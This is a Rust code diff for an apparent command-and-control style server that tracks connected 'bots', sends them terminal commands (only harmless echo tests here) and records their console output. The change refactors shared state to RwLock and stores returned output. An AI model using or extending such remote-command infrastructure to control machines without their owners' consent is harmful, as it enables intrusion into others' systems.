@@ -4,7 +4,7 @@ use client_vars::types::{
     receive::{ CallTerminalCommandParams, ClientAction, ClientParams },
     send::{ BoogeymanSendPayload, ServerAction, ServerParams },
 };
-use tokio::{ net::TcpStream, sync::Mutex };
+use tokio::{ net::TcpStream, sync::{ Mutex, RwLock } };
 use anyhow::Result;
 use crate::server::{
     http_server::{ Bot, ClientInstance, ServerHandler },
@@ -24,6 +24,18 @@ pub async fn route_client(
             // in each - verify id and version - must exist in inited list if not ignore
             if let ServerParams::TerminalOutput(params) = &payload.params {
                 println!("Received {:#?}:{:#?}", payload.action, params);
+
+                if let Some(output) = &params.output {
+                    let bot_map = handler.bot_map.read().await;
+                    let bot = bot_map.get(&payload.id).unwrap();
+                    let mut instances = bot.client_instances.write().await;
+
+                    let client_instance: &mut ClientInstance = instances
+                        .iter_mut()
+                        .find(|instance| instance.version == payload.version)
+                        .unwrap();
+                    client_instance.console = output.clone();
+                }
             } else {
                 return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
             }
@@ -91,12 +103,19 @@ pub async fn init(
             stream: stream_ref.clone(),
         };
         if let Some(bot) = bot_map.get_mut(&payload.id) {
-            bot.client_instances.push(client_new_instance);
+            let mut client_instances = bot.client_instances.write().await;
+            client_instances.push(client_new_instance);
             bot.verified = true;
         } else {
             bot_map.insert(
                 payload.id.clone(),
-                Bot::new(payload.id.clone(), vec![client_new_instance], vec![], true, None)
+                Bot::new(
+                    payload.id.clone(),
+                    Arc::new(RwLock::new(vec![client_new_instance])),
+                    Arc::new(RwLock::new(vec![])),
+                    true,
+                    None
+                )
             );
         }
         println!("new bot : {:#?}", payload.id);
@@ -105,7 +124,6 @@ pub async fn init(
             stream_ref.clone(),
             ClientAction::CallTerminalCommand,
             ClientParams::CallTerminalCommand(CallTerminalCommandParams {
-                clear_console: false,
                 command: "echo test".to_owned(),
             })
         ).await?;
@@ -113,7 +131,6 @@ pub async fn init(
             stream_ref.clone(),
             ClientAction::CallTerminalCommand,
             ClientParams::CallTerminalCommand(CallTerminalCommandParams {
-                clear_console: false,
                 command: "echo test2".to_owned(),
             })
         ).await?;
